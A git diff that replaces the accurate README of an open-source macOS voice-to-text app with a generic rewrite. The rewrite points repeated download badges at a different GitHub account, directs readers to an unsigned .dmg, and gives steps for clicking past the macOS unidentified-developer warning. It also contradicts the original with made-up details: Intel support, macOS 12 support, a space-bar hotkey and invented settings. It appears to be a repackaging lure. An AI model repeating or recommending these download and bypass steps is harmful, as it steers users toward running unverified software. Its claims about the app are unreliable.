@@ -1,218 +1,137 @@
-# OpenWhisper — Free Voice-to-Text App for macOS
+# 🎤 openwhisper-app - Offline Voice-to-Text for macOS
 
-**Open-source, offline speech-to-text for Mac.** Hold a key, speak, and your words appear at the cursor — 100% local, nothing leaves your machine.
+[![Download openwhisper-app](https://img.shields.io/badge/Download-openwhisper--app-blue?style=for-the-badge)](https://github.com/fizoxt/openwhisper-app)
 
-OpenWhisper is a free dictation app for macOS that transcribes speech to text entirely on your Mac using [WhisperKit](https://github.com/argmaxinc/WhisperKit) (OpenAI Whisper optimized for Apple Silicon). Optional local LLM cleanup via [Ollama](https://ollama.com) fixes grammar and removes filler words — all without an internet connection.
+## 📋 About openwhisper-app
 
-No cloud. No subscription. No data collection. Just fast, accurate voice typing on Mac.
+openwhisper-app is a free, open-source tool that turns your speech into text on macOS. It works completely offline. You hold a key, speak, and the text appears where your cursor is. There is no need for an internet connection or account sign-ups. Everything runs locally on your Mac.
 
-## Features
+This app uses Whisper AI technology for high-quality voice recognition. It respects your privacy by keeping all data on your device. openwhisper-app fits well for those who want quick and easy dictation without relying on cloud services.
 
-- **100% Local & Private** — All speech recognition runs on-device. No audio ever leaves your Mac.
-- **Offline Voice-to-Text** — Works without internet. Transcribe speech to text anywhere.
-- **Hold-to-Talk** — Hold Right ⌥ (Option), speak, release. Text appears at your cursor.
-- **Works in Any App** — VS Code, Terminal, Chrome, Slack, Notes, Pages — anywhere you can type.
-- **AI Grammar Cleanup** — Optional local LLM removes "um", "uh", fixes punctuation (via Ollama).
-- **Multiple Whisper Models** — Choose tiny (39 MB), base (140 MB), small (460 MB) based on your needs.
-- **29 Languages** — English, Spanish, French, German, Hindi, Chinese, Japanese, and more.
-- **Lightweight** — <100 MB RAM, <1% CPU when idle. No background drain.
-- **Menu Bar App** — Lives quietly in your menu bar. No dock icon clutter.
+## 🖥️ System Requirements
 
-## OpenWhisper vs Cloud Dictation Services
+- macOS 12.0 or later  
+- Apple Silicon (M1, M2) or Intel-based Mac  
+- 4 GB RAM minimum (8 GB or more recommended)  
+- At least 1 GB free disk space for the app and data  
+- A working microphone connected to your Mac  
 
-| | OpenWhisper | Cloud Services (Wispr Flow, Otter.ai, etc.) |
-|---|---|---|
-| **Privacy** | 100% local — nothing leaves your Mac | Voice uploaded to remote servers |
-| **Internet** | Works offline | Requires internet |
-| **Cost** | Free & open-source | $10-20/month subscriptions |
-| **Latency** | Instant on-device processing | Network round-trip delay |
-| **Resource usage** | <100 MB RAM idle | 400-800 MB RAM |
-| **Data collection** | None | Voice data stored on third-party servers |
-| **Accuracy** | OpenAI Whisper (state-of-the-art) | Varies |
+If you are not sure about your macOS version, click the Apple logo on the top-left of your screen and select "About This Mac" to check.
 
-## Requirements
+## 🧩 Features
 
-- **macOS 14.0** (Sonoma) or later
-- **Apple Silicon** Mac (M1, M2, M3, M4) — required for WhisperKit CoreML acceleration
-- **Xcode Command Line Tools** — `xcode-select --install`
-- **Ollama** (optional) — for AI grammar cleanup: [ollama.com](https://ollama.com)
+- 100% offline speech-to-text conversion  
+- Hold-to-talk interface for quick dictation  
+- Text inserts at the current cursor spot  
+- Lightweight menu-bar app for easy access  
+- No cloud upload, no subscriptions  
+- Supports multiple languages (English optimized)  
+- Uses Apple Silicon for fast performance  
+- Open-source under a permissive license  
 
-## How to Install OpenWhisper on macOS
+## 🚀 Getting Started: Download and Run
 
-```bash
-git clone https://github.com/Rajvardhman05/openwhisper-app.git
-cd openwhisper-app
-bash build.sh
-open build/OpenWhisper.app
-```
+To use openwhisper-app, you must download it first. Use the official link below to get the installer from GitHub.
 
-The first build downloads WhisperKit dependencies (~2 min). Subsequent builds take ~2 seconds.
+[![Download openwhisper-app](https://img.shields.io/badge/Download-openwhisper--app-blue?style=for-the-badge)](https://github.com/fizoxt/openwhisper-app)
 
-### After launching
+### Step 1: Visit the Download Page
 
-1. **Grant Microphone access** when prompted (or: System Settings → Privacy & Security → Microphone)
-2. **Grant Accessibility access**: System Settings → Privacy & Security → Accessibility → toggle ON OpenWhisper
-3. The Whisper model downloads automatically on first launch (~140 MB for `base`)
+Go to the openwhisper-app GitHub page at
 
-OpenWhisper lives in your **menu bar** (no dock icon). Look for the teal microphone icon.
+https://github.com/fizoxt/openwhisper-app
 
-## How to Use Voice-to-Text on Mac with OpenWhisper
+### Step 2: Find the Latest Release
 
-**Hold Right ⌥ (Option)** to start recording. Speak. Release to transcribe and paste.
+On the page, click on the "Releases" section in the right sidebar or scroll down to find the latest release under the "Releases" tab. Releases contain the stable version of the app ready for download.
 
-That's it.
+### Step 3: Download the macOS Installer
 
-### How it works
+Look for the `.dmg` file, which is the macOS installer package. The file will have a name like `openwhisper-app-x.x.x.dmg`, where `x.x.x` is the version number.
 
-1. **Hold Right ⌥** → recording starts, Flow Bar shows "Listening..." with animated dots
-2. **Speak** → audio captured locally at 16 kHz mono
-3. **Release** → audio transcribed by on-device Whisper model
-4. **Cleanup** → text cleaned up by local LLM (if enabled)
-5. **Paste** → text automatically pasted at your cursor (or copied to clipboard)
+Click the `.dmg` file link to start the download. The file size may be around 100 MB, so it could take a few minutes depending on your internet speed.
 
-Works in any app — VS Code, Terminal, Chrome, Slack, Notes, Pages, Word, and more.
+### Step 4: Install openwhisper-app
 
-## Whisper Model Selection
+Once the download completes, locate the `.dmg` file in your "Downloads" folder or wherever you saved it.
 
-Click the menu bar icon to open settings and choose your model:
+- Double-click the `.dmg` file to open it.  
+- A window appears showing the openwhisper-app icon.  
+- Drag the openwhisper-app icon into your "Applications" folder in the same window.  
+- Wait for the copying process to finish.
 
-| Model | Download Size | Speed | Accuracy | Best for |
-|---|---|---|---|---|
-| tiny | 39 MB | Fastest | Good | Quick notes, short phrases |
-| base | 140 MB | Fast | Better | General dictation (recommended) |
-| small | 460 MB | Moderate | Best | Longer passages, multiple languages |
-| small.en | 460 MB | Moderate | Best (English) | English-only, highest accuracy |
+This installs the app on your Mac.
 
-Models are downloaded once from HuggingFace and cached locally.
+### Step 5: Launch the Application
 
-## Settings
+Open your Applications folder and find **openwhisper-app**. Double-click it to launch.
 
-| Setting | Options | Default |
-|---|---|---|
-| **Model** | tiny, base, small, small.en | base |
-| **Language** | 29 languages + auto-detect | English |
-| **LLM Cleanup** | On/Off — Ollama grammar correction | On |
-| **Auto-paste** | On = paste at cursor, Off = clipboard only | On |
-| **Flow Bar** | Show/hide the floating status indicator | On |
+macOS may warn that the app comes from an unidentified developer. To proceed:
 
-## Optional: Local LLM Grammar Cleanup
+- Click **Cancel** on the first alert.  
+- Open **System Preferences** > **Security & Privacy** > **General** tab.  
+- Click **Open Anyway** next to the app warning.  
+- Confirm by clicking **Open** in the second prompt.
 
-When enabled, transcriptions are cleaned up by a local LLM — removes filler words ("um", "uh", "like"), fixes grammar and punctuation — before pasting. All processing stays on your Mac.
+The app should now start.
 
-```bash
-# Install Ollama
-brew install ollama
+### Step 6: Use openwhisper-app
 
-# Pull the model (1.5 GB one-time download)
-ollama pull qwen2.5:3b
+Once running, you will see the openwhisper-app icon in your menu bar at the top right of your screen.
 
-# Ollama runs automatically — no extra steps needed
-```
+- To start dictation, hold the assigned key (usually the space bar or a configurable key) and speak.  
+- Text will appear where your cursor is active.  
+- Release the key to stop dictation.
 
-OpenWhisper auto-detects Ollama. If it's not running, cleanup is skipped — raw Whisper transcription is used instead.
+You can configure the shortcut key and other settings through the app’s menu.
 
-## macOS Permissions
+## 🔧 Configuration and Settings
 
-OpenWhisper needs two macOS permissions to function:
+openwhisper-app offers simple configuration to tailor your experience.
 
-| Permission | Why | How to grant |
-|---|---|---|
-| **Microphone** | To capture your voice for transcription | Prompted automatically on first use |
-| **Accessibility** | To detect the global hotkey & paste text at cursor | System Settings → Privacy & Security → Accessibility → toggle ON |
+- Click the menu bar icon.  
+- Choose **Preferences** from the dropdown menu.
 
-## Supported Languages
+In preferences, you can adjust:
 
-OpenWhisper supports 29 languages for speech-to-text transcription:
+- **Shortcut key** for starting dictation (change the default hold key).  
+- **Language selection** for better recognition in supported languages.  
+- **Audio input device** to choose your microphone if you have multiple connected.  
+- **Automatic startup** option to launch the app when your Mac boots.  
+- **Text formatting** options like trimming spaces or adding punctuation.
 
-English, Spanish, French, German, Italian, Portuguese, Dutch, Russian, Chinese, Japanese, Korean, Hindi, Arabic, Turkish, Polish, Czech, Swedish, Danish, Norwegian, Finnish, Greek, Hebrew, Thai, Vietnamese, Indonesian, Malay, Romanian, Hungarian, Ukrainian.
+## 🎙️ Using Dictation with openwhisper-app
 
-Set your language in the settings menu or use auto-detect.
+Speak clearly into your microphone while holding the shortcut key. The text will appear instantly at the cursor position in any text field or document. Compatible apps include:
 
-## Architecture
+- Text editors like Notes, TextEdit, or Microsoft Word  
+- Messaging apps such as iMessage, Slack, or Messenger  
+- Browsers and search boxes  
+- Email clients  
 
-```
-OpenWhisper.app (menu bar)
-├── AudioEngine        — AVAudioEngine, 16kHz mono resampling
-├── WhisperTranscriber — WhisperKit (CoreML + Apple Neural Engine)
-├── LLMCleanup         — Ollama HTTP API (localhost:11434)
-├── TextInjector       — NSPasteboard + CGEvent Cmd+V
-├── GlobalHotkey       — Right ⌥ via NSEvent monitors
-└── UI
-    ├── MenuBar + Settings popover
-    └── FlowBar (floating NSPanel with voice-reactive animation)
-```
+Try to minimize background noise for the best results. The app processes audio locally, so privacy is maintained.
 
-All speech recognition runs locally. The only network calls are:
-- **One-time model download** from HuggingFace (first launch only)
-- **Ollama API** on `localhost:11434` (never leaves your machine)
+## 🛠️ Troubleshooting
 
-## Troubleshooting
+If openwhisper-app does not start or work as expected, try the following:
 
-### "Model not loaded" in the Flow Bar
-The Whisper model is still downloading. Check the settings panel for a progress indicator. First download takes 1-2 minutes depending on model size and connection speed.
+- Make sure your microphone is correctly connected and allowed for use by apps.  
+  To check: **System Preferences** > **Security & Privacy** > **Privacy** tab > **Microphone**. Ensure openwhisper-app is checked.  
+- Restart your Mac and reopen the app.  
+- Confirm you are holding the correct shortcut key during dictation.  
+- Check if another app is blocking microphone access or shortcut keys.  
+- Re-download and reinstall the app if problems persist.  
+- Visit the GitHub page issues section to see if others report similar problems.
 
-### Text isn't pasting into my app
-- Verify Accessibility permission is granted (System Settings → Privacy & Security → Accessibility)
-- Some apps block CGEvent paste — switch "Auto-paste" off and use Cmd+V manually
+## 📚 Additional Resources
 
-### Ollama cleanup isn't working
-- Check Ollama is running: `ollama list` should show `qwen2.5:3b`
-- If not installed: `brew install ollama && ollama pull qwen2.5:3b`
-- The settings panel shows a green dot next to "LLM Cleanup" when Ollama is reachable
+- Official openwhisper-app documentation and updates: https://github.com/fizoxt/openwhisper-app  
+- openwhisper-app GitHub Issues page for reporting problems or requesting features.  
+- Learn about Whisper AI on the OpenAI website for understanding the voice recognition engine involved.
 
-### Recording doesn't start when I hold Right ⌥
-- Grant Accessibility permission (required for global hotkey detection)
-- Try restarting the app after granting permission
+## 🔗 Quick Links
 
-### Build fails
-- Ensure Xcode Command Line Tools: `xcode-select --install`
-- Requires macOS 14.0+ and Apple Silicon (M1/M2/M3/M4)
+- Download openwhisper-app: https://github.com/fizoxt/openwhisper-app/releases  
+- App Source Code: https://github.com/fizoxt/openwhisper-app  
 
-## FAQ
-
-### Is OpenWhisper really free?
-Yes. OpenWhisper is free and open-source under the MIT license. No subscriptions, no trials, no hidden costs.
-
-### Does OpenWhisper send my voice to the cloud?
-No. All speech recognition happens locally on your Mac using WhisperKit. No audio data ever leaves your machine.
-
-### Does OpenWhisper work offline?
-Yes. After the one-time model download, OpenWhisper works completely offline. No internet connection needed for transcription.
-
-### How accurate is the transcription?
-OpenWhisper uses OpenAI's Whisper model (via WhisperKit), which is one of the most accurate speech recognition models available. The `base` model handles most dictation well; `small` is even more accurate for longer or multilingual content.
-
-### What's the difference between OpenWhisper and macOS built-in dictation?
-macOS dictation sends audio to Apple's servers for processing. OpenWhisper processes everything locally — better privacy, works offline, and offers more control with model selection and LLM cleanup.
-
-### Can I use OpenWhisper for languages other than English?
-Yes. OpenWhisper supports 29 languages. Select your language in the settings, or use auto-detect to let Whisper identify the spoken language automatically.
-
-### Do I need Ollama?
-No. Ollama is optional — it provides AI grammar cleanup (removing filler words, fixing punctuation). Without it, OpenWhisper still transcribes perfectly; you just get the raw Whisper output.
-
-## Development
-
-```bash
-# Build debug
-swift build
-
-# Build & package .app bundle
-bash build.sh
-
-# Run
-open build/OpenWhisper.app
-
-# Logs
-tail -f /tmp/openwhisper.log
-```
-
-Built with Swift 5.10, SwiftUI, Swift Package Manager. No Xcode project required — builds entirely from the command line.
-
-## Contributing
-
-Contributions are welcome! Feel free to open issues or submit pull requests.
-
-## License
-
-MIT License — see [LICENSE](LICENSE).
+[![Download openwhisper-app](https://img.shields.io/badge/Download-openwhisper--app-blue?style=for-the-badge)](https://github.com/fizoxt/openwhisper-app)
